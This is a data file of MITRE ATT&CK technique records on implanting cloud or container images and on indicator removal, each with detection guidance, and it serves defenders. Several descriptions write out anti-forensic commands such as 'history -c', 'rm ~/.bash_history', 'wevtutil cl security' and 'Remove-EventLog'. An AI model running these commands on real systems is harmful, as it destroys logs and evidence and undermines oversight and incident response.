{"ID":"T1525","name":"Implant Internal Image","description":"Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike [Upload Malware](https://attack.mitre.org/techniques/T1608/001), this technique focuses on adversaries implanting an image in a registry within a victim’s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)\n\nA tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)","url":"https://attack.mitre.org/techniques/T1525","created":"04 September 2019","last modified":"08 March 2022","version":"2.1","tactics":"Persistence","detection":"Monitor interactions with images and containers by users to identify ones that are added or modified anomalously.\n\nIn containerized environments, changes may be detectable by monitoring the Docker daemon logs or setting up and monitoring Kubernetes audit logs depending on registry configuration. ","platforms":"Containers, IaaS","data sources":"Image: Image Creation, Image: Image Metadata, Image: Image Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Praetorian; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Content trust in Azure Container Registry),(Citation: Content trust in Docker)"}
{"ID":"T1070","name":"Indicator Removal","description":"Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.","url":"https://attack.mitre.org/techniques/T1070","created":"31 May 2017","last modified":"11 April 2023","version":"2.1","tactics":"Defense Evasion","detection":"File system monitoring may be used to detect improper deletion or modification of indicator files.  Events not stored on the file system may require different detection mechanisms.","platforms":"Containers, Google Workspace, Linux, Network, Office 365, Windows, macOS","data sources":"Application Log: Application Log Content, Command: Command Execution, File: File Deletion, File: File Metadata, File: File Modification, Firewall: Firewall Rule Modification, Network Traffic: Network Traffic Content, Process: OS API Execution, Process: Process Creation, Scheduled Job: Scheduled Job Modification, User Account: User Account Authentication, User Account: User Account Deletion, Windows Registry: Windows Registry Key Deletion, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Anti-virus, Host intrusion prevention systems, Log analysis","contributors":"Blake Strom, Microsoft 365 Defender; Brad Geesaman, @bradgeesaman; Ed Williams, Trustwave, SpiderLabs","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Donut Github),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: McAfee Sharpshooter December 2018),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Proofpoint TA505 October 2019),(Citation: Microsoft NICKEL December 2021),(Citation: Proofpoint Leviathan Oct 2017),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: McAfee Maze March 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: Prevailion EvilNum May 2020),(Citation: F-Secure BlackEnergy 2014),(Citation: Lazarus APT January 2022),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: US-CERT Bankshot Dec 2017),(Citation: Prevailion DarkWatchman 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: NTT Security Flagpro new December 2021),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: ESET Hermetic Wizard March 2022),(Citation: Cybereason Kimsuky November 2020),(Citation: Crowdstrike DriveSlayer February 2022),"}
{"ID":"T1070.003","name":"Indicator Removal: Clear Command History","description":"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)","url":"https://attack.mitre.org/techniques/T1070/003","created":"31 January 2020","last modified":"07 April 2023","version":"1.4","tactics":"Defense Evasion","detection":"User authentication, especially via remote terminal services like SSH, without new entries in that user's <code>~/.bash_history</code> is suspicious. Additionally, the removal/clearing of the <code>~/.bash_history</code> file can be an indicator of suspicious activity.\n\nMonitor for suspicious modifications or deletion of <code>ConsoleHost_history.txt</code> and use of the <code>Clear-History</code> command.","platforms":"Linux, Network, Windows, macOS","data sources":"Command: Command Execution, File: File Deletion, File: File Modification, User Account: User Account Authentication","is sub-technique":true,"sub-technique of":"T1070","defenses bypassed":"Host forensic analysis, Log analysis","contributors":"Austin Clark, @c2defense; Emile Kenning, Sophos; Vikas Singh, Sophos","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Kobalos Feb 2021),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Cisco Talos Intelligence Group),(Citation: Securelist APT10 March 2021),(Citation: FireEye APT41 Aug 2019),(Citation: Unit 42 Hildegard Malware),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Trend Micro TeamTNT),(Citation: Securing bash history)"}
{"ID":"T1070.002","name":"Indicator Removal: Clear Linux or Mac System Logs","description":"Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n","url":"https://attack.mitre.org/techniques/T1070/002","created":"28 January 2020","last modified":"29 March 2020","version":"1.0","tactics":"Defense Evasion","detection":"File system monitoring may be used to detect improper deletion or modification of indicator files. Also monitor for suspicious processes interacting with log files.","platforms":"Linux, macOS","data sources":"Command: Command Execution, File: File Deletion, File: File Modification","is sub-technique":true,"sub-technique of":"T1070","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET DazzleSpy Jan 2022),(Citation: Aqua TeamTNT August 2020),(Citation: objsee mac malware 2017),(Citation: Anomali Rocke March 2019),"}
{"ID":"T1070.008","name":"Indicator Removal: Clear Mailbox Data","description":"Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. \n\nAdversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003) for command and control, or email-based exfiltration such as [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports.(Citation: Volexity SolarWinds)(Citation: ExchangePowerShell Module) On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code>  or use [AppleScript](https://attack.mitre.org/techniques/T1059/002) to interact with APIs on macOS.(Citation: Cybereason Cobalt Kitty 2017)(Citation: mailx man page)\n\nAdversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.(Citation: Microsoft OAuth Spam 2022)","url":"https://attack.mitre.org/techniques/T1070/008","created":"08 July 2022","last modified":"12 April 2023","version":"1.1","tactics":"Defense Evasion","detection":null,"platforms":"Google Workspace, Linux, Office 365, Windows, macOS","data sources":"Application Log: Application Log Content, Command: Command Execution, File: File Deletion, File: File Modification, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1070","defenses bypassed":null,"contributors":"Liran Ravich, CardinalOps","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Volexity SolarWinds),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Microsoft Manage Mail Flow Rules 2023)"}
{"ID":"T1070.007","name":"Indicator Removal: Clear Network Connection History and Configurations","description":"Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.\n\nNetwork connection history may be stored in various locations on a system. For example, RDP connection history may be stored in Windows Registry values under (Citation: Microsoft RDP Removal):\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindows may also store information about recent RDP connections in files such as <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code> and `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal\nServer Client\\Cache\\`.(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)\n\nMalicious network connections may also require changes to network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.","url":"https://attack.mitre.org/techniques/T1070/007","created":"15 June 2022","last modified":"21 October 2022","version":"1.0","tactics":"Defense Evasion","detection":null,"platforms":"Linux, Network, Windows, macOS","data sources":"Command: Command Execution, File: File Modification, Firewall: Firewall Rule Modification, Process: Process Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1070","defenses bypassed":null,"contributors":"CrowdStrike Falcon OverWatch","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft Deep Dive Solorigate January 2021),"}
{"ID":"T1070.009","name":"Indicator Removal: Clear Persistence","description":"Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, [Modify Registry](https://attack.mitre.org/techniques/T1112), [Plist File Modification](https://attack.mitre.org/techniques/T1647), or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.(Citation: Cylance Dust Storm) Adversaries may also delete accounts previously created to maintain persistence (i.e. [Create Account](https://attack.mitre.org/techniques/T1136)).(Citation: Talos - Cisco Attack 2022)\n\nIn some instances, artifacts of persistence may also be removed once an adversary’s persistence is executed in order to prevent errors with the new instance of the malware.(Citation: NCC Group Team9 June 2020)","url":"https://attack.mitre.org/techniques/T1070/009","created":"29 July 2022","last modified":"11 April 2023","version":"1.1","tactics":"Defense Evasion","detection":null,"platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Deletion, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Modification, User Account: User Account Deletion, Windows Registry: Windows Registry Key Deletion, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1070","defenses bypassed":null,"contributors":"Gavin Knapp","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCC Group Team9 June 2020),(Citation: Cylance Dust Storm),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Trustwave Pillowmint June 2020),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Trend Micro njRAT 2018),(Citation: ESET RTM Feb 2017),(Citation: Group IB GrimAgent July 2021),(Citation: Secureworks MCMD July 2019),"}
{"ID":"T1070.001","name":"Indicator Removal: Clear Windows Event Logs","description":"Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\nThe event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging. Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)","url":"https://attack.mitre.org/techniques/T1070/001","created":"28 January 2020","last modified":"12 April 2023","version":"1.2","tactics":"Defense Evasion","detection":"Deleting Windows event logs (via native binaries (Citation: Microsoft wevtutil Oct 2017), API functions (Citation: Microsoft EventLog.Clear), or [PowerShell](https://attack.mitre.org/techniques/T1059/001) (Citation: Microsoft Clear-EventLog)) may also generate an alterable event (Event ID 1102: \"The audit log was cleared\").","platforms":"Windows","data sources":"Command: Command Execution, File: File Deletion, Process: OS API Execution","is sub-technique":true,"sub-technique of":"T1070","defenses bypassed":"Anti Virus, Host Intrusion Prevention Systems, Log Analysis","contributors":"Lucas Heiligenstein","permissions required":null,"supports remote":null,"system requirements":"Clearing the Windows event logs requires Administrator permissions","impact type":null,"effective permissions":null,"relationship citations":"(Citation: Symantec Hydraq Jan 2010),(Citation: NCC Group Chimera January 2021),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: McAfee Gold Dragon),(Citation: FireEye Hacking Team),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Talos Nyetya June 2017),(Citation: Wevtutil Microsoft Documentation),(Citation: FoxIT Wocao December 2019),(Citation: DOJ GRU Indictment Jul 2018),(Citation: FireEye APT32 May 2017),(Citation: US-CERT TA18-074A),(Citation: FireEye APT41 Aug 2019),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Microsoft BlackCat Jun 2022),(Citation: Gh0stRAT ATT March 2019),(Citation: Unit 42 Lucifer June 2020),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: Talos ZxShell Oct 2014),(Citation: Crowdstrike DNC June 2016),(Citation: FinFisher Citation),(Citation: Microsoft FinFisher March 2018),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Check Point Meteor Aug 2021),(Citation: FireEye APT38 Oct 2018),(Citation: Talos Olympic Destroyer 2018),(Citation: ESEST Black Energy Jan 2016),(Citation: ESET Hermetic Wizard March 2022),(Citation: SentinelLabs Metador Sept 2022),(Citation: GitHub Pupy),(Citation: Symantec WastedLocker June 2020),"}
{"ID":"T1070.004","name":"Indicator Removal: File Deletion","description":"Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.","url":"https://attack.mitre.org/techniques/T1070/004","created":"31 January 2020","last modified":"16 April 2022","version":"1.1","tactics":"Defense Evasion","detection":"It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Deletion","is sub-technique":true,"sub-technique of":"T1070","defenses bypassed":"Host forensic analysis","contributors":"Walker Johnson","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: CarbonBlack LockerGoga 2019),(Citation: XAgentOSX 2017),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Group IB Silence Sept 2018),(Citation: Trend Micro DRBControl February 2020),(Citation: TrendMicro Lazarus Nov 2018),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Cybereason Oceanlotus May 2017),(Citation: FoxIT Wocao December 2019),(Citation: Securelist WhiteBear Aug 2017),(Citation: Talos Konni May 2017),(Citation: Deep Instinct TA505 Apr 2019),(Citation: CISA AppleJeus Feb 2021),(Citation: Microsoft SDelete July 2016),(Citation: ESET InvisiMole June 2018),(Citation: Kaspersky WIRTE November 2021),(Citation: Crowdstrike Qakbot October 2020),(Citation: NCCGroup RokRat Nov 2018),(Citation: Flashpoint FIN 7 March 2019),(Citation: DOJ GRU Indictment Jul 2018),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Korean FSI TA505 2020),(Citation: Fysbis Dr Web Analysis),(Citation: ESET Grandoreiro April 2020),(Citation: Unit42 Emissary Panda May 2019),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: ESET Okrum July 2019),(Citation: Trustwave Pillowmint June 2020),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: ESET Zebrocy Nov 2018),(Citation: Fidelis njRAT June 2013),(Citation: FireEye APT17),(Citation: objsee mac malware 2017),(Citation: Trustwave GoldenSpy2 June 2020),(Citation: Unit 42 Kazuar May 2017),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Unit 42 Bisonal July 2018),(Citation: Morphisec ShellTea June 2019),(Citation: ANSSI Sandworm January 2021),(Citation: Leonardo Turla Penquin May 2020),(Citation: ESET Telebots July 2017),(Citation: Unit 42 NETWIRE April 2020),(Citation: Anomali Rocke March 2019),(Citation: Unit 42 QUADAGENT July 2018),(Citation: FireEye APT34 Dec 2017),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Talos Promethium June 2020),(Citation: McAfee Night Dragon),(Citation: ESET Sednit Part 2),(Citation: Bitdefender StrongPity June 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: KISA Operation Muzabi),(Citation: Microsoft SIR Vol 21),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: Profero APT27 December 2020),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Proofpoint Bumblebee April 2022),(Citation: Talos Bisonal Mar 2020),(Citation: Group IB GrimAgent July 2021),(Citation: Proofpoint TA505 Jan 2019),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: NCC Group Team9 June 2020),(Citation: Mandiant APT1 Appendix),(Citation: Palo Alto Networks BBSRAT),(Citation: Symantec Hydraq Jan 2010),(Citation: Kaspersky ProjectSauron Full Report),(Citation: Securelist Calisto July 2018),(Citation: ClearSky Wilted Tulip July 2017),(Citation: McAfee Gold Dragon),(Citation: ClearSky Siamesekitten August 2021),(Citation: Secureworks Karagany July 2019),(Citation: Cisco Talos Intelligence Group),(Citation: Talos Cobalt Group July 2018),(Citation: Proofpoint TA505 October 2019),(Citation: TrendMicro BlackTech June 2017),(Citation: McAfee Oceansalt Oct 2018),(Citation: FireEye HAWKBALL Jun 2019),(Citation: FOX-IT May 2016 Mofang),(Citation: McAfee Honeybee),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: TrendMicro Gamaredon April 2020),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Palo Alto MoonWind March 2017),(Citation: ESET Sednit Part 1),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Check Point Pay2Key November 2020),(Citation: Mandiant No Easy Breach),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Symantec Dragonfly),(Citation: CERT-EE Gamaredon January 2021),(Citation: ESET Machete July 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: ESET OceanLotus macOS April 2019),(Citation: FireEye FIN7 April 2017),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: CERT-FR PYSA April 2020),(Citation: Unit 42 Inception November 2018),(Citation: Symantec Remsec IOCs),(Citation: Bitdefender Naikon April 2021),(Citation: FireEye TRITON 2019),(Citation: jRAT Symantec Aug 2018),(Citation: Unit 42 Sofacy Feb 2018),(Citation: fsecure NanHaiShu July 2016),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: Unit 42 CARROTBAT November 2018),(Citation: Symantec Shuckworm January 2022),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Trend Micro IXESHE 2012),(Citation: Cylance Shaheen Nov 2018),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Unit 42 OilRig Sept 2018),(Citation: FireEye MESSAGETAP October 2019),(Citation: Symantec Pasam May 2012),(Citation: Cisco Ukraine Wipers January 2022),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ESET Gelsemium June 2021),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: FBI FLASH APT39 September 2020),(Citation: CrowdStrike Putter Panda),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: FireEye FIN10 June 2017),(Citation: Unit 42 NOKKI Sept 2018),(Citation: ESET Dukes October 2019),(Citation: NSA/FBI Drovorub August 2020),(Citation: FireEye MuddyWater Mar 2018),(Citation: FireEye APT35 2018),(Citation: CheckPoint Naikon May 2020),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Volexity PowerDuke November 2016),(Citation: Intel 471 REvil March 2020),(Citation: CISA EB Aug 2020),(Citation: Kroll Qakbot June 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Accenture Dragonfish Jan 2018),(Citation: McAfee Sharpshooter December 2018),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: FireEye Hacking Team),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: ESET LoudMiner June 2019),(Citation: Dell Sakula),(Citation: ESET GreyEnergy Oct 2018),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: McAfee Cuba April 2021),(Citation: ESET Telebots Dec 2016),(Citation: Accenture Hogfish April 2018),(Citation: FireEye Clandestine Fox),(Citation: ATT QakBot April 2021),(Citation: ESET Sednit USBStealer 2014),(Citation: Cyberreason Anchor December 2019),(Citation: Fidelis Turbo),(Citation: FireEye APT41 Aug 2019),(Citation: ZScaler Hacking Team),(Citation: Sophos SamSam Apr 2018),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Novetta Blockbuster),(Citation: TrendMicro Ursnif Mar 2015),(Citation: FireEye FIN6 April 2016),(Citation: FireEye Hancitor),(Citation: Kaspersky Lyceum October 2021),(Citation: ASERT InnaputRAT April 2018),(Citation: Talos ZxShell Oct 2014),(Citation: CheckPoint Bandook Nov 2020),(Citation: ESET Attor Oct 2019),(Citation: Kaspersky StoneDrill 2017),(Citation: Sofacy Komplex Trojan),(Citation: objective-see windtail2 jan 2019),(Citation: Kaspersky CactusPete Aug 2020),(Citation: FireEye FELIXROOT July 2018),(Citation: ESET Gazer Aug 2017),(Citation: ESET Zebrocy May 2019),(Citation: Trustwave Cherry Picker),(Citation: CISA Zebrocy Oct 2020),(Citation: GDATA Zeus Panda June 2017),(Citation: DFIR Phosphorus November 2021),(Citation: ESET EvilNum July 2020),(Citation: CrowdStrike IceApple May 2022),(Citation: Cylance Dust Storm),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Unit42 BabyShark Apr 2019),(Citation: FireEye Periscope March 2018),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Securelist Dtrack),(Citation: Dell Lateral Movement),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Unit42 RDAT July 2020),(Citation: SentinelLabs Metador Sept 2022),(Citation: ESET Hermetic Wizard March 2022),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Palo Alto Reaver Nov 2017),(Citation: Cybereason Kimsuky November 2020),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Microsoft PLATINUM April 2016),(Citation: Novetta Winnti April 2015),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Medium Metamorfo Apr 2020),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: ESET LightNeuron May 2019),(Citation: US-CERT TYPEFRAME June 2018),(Citation: TechNet Del),(Citation: Kaspersky Turla Aug 2014),(Citation: ESET InvisiMole June 2020),(Citation: Fidelis INOCNATION),(Citation: McAfee Bankshot),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Symantec Linfo May 2012),(Citation: Unit42 Redaman January 2019),(Citation: US-CERT TA18-074A),(Citation: Malwarebytes Pony April 2016),(Citation: FireEye FIN7 Oct 2019),(Citation: FireEye APT32 May 2017),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Kaspersky MoleRATs April 2019),(Citation: BlackBerry CostaRicto November 2020),(Citation: ESET Operation Groundbait),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Gh0stRAT ATT March 2019),(Citation: Citizen Lab Group5),(Citation: Talos Lokibot Jan 2021),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Group IB Ransomware September 2020),(Citation: Unit 42 BackConfig May 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Unit 42 Hildegard Malware),(Citation: ESET RTM Feb 2017),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: ESET DazzleSpy Jan 2022),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Securelist Kimsuky Sept 2013),(Citation: FireEye APT38 Oct 2018),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Check Point Meteor Aug 2021),(Citation: Talos PoetRAT April 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: Symantec Seaduke 2015),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: alientvault macspy),(Citation: FireEye CARBANAK June 2017),(Citation: TrendMicro MacOS April 2018),(Citation: Trend Micro njRAT 2018),(Citation: Cycraft Chimera April 2020),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: McAfee GhostSecret),"}
